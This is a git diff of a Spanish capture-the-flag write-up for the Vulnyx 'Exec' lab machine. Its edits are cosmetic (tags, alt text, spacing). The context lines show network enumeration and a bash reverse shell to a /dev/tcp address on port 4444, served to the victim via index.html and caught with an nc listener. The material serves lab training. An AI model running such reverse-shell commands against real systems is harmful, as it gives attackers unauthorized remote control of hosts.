@@ -3,13 +3,13 @@ title: Vulnyx - Exec
 author: estx
 date: 2024-04-25 17:51:00 +0800
 categories: [Writeup, Vulnyx, Low]
-tags: [Linux, 'SMB', 'File Upload' , 'binary abusing']
+tags: ['Linux', 'SMB', 'File Upload', 'binary abusing']
 math: true
 mermaid: true
 image:
   path: /assets/images/Vulnyx/Low/Exec/logo.png
   lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
-  alt: Plex Machine Logo
+  alt: Exec Machine Logo
 ---
 
 Máquina Linux de nivel **Low** de Vulnyx.
@@ -26,6 +26,7 @@ root@kali> arp-scan -I eth0 --local --ignoredups
 <SNIP>
 192.168.100.63	08:00:27:c6:4f:1d	PCS Systemtechnik GmbH
 ```
+
 > Con esto identificamos todos los dispositivos en nuestra red local.
 
 a. Enumeramos los puertos que están abiertos.
@@ -107,6 +108,7 @@ bash -i >& /dev/tcp/192.168.100.55/4444 0>&1
 
 ❯ nc -lvnp 4444
 ```
+
 > Con esto lo que hacemos es servir el archivo `index.html`, para que al ser requerido por la máquina víctima se ejecute el código **.sh**
 
 * Hacemos que la máquina víctima solicite el archivo
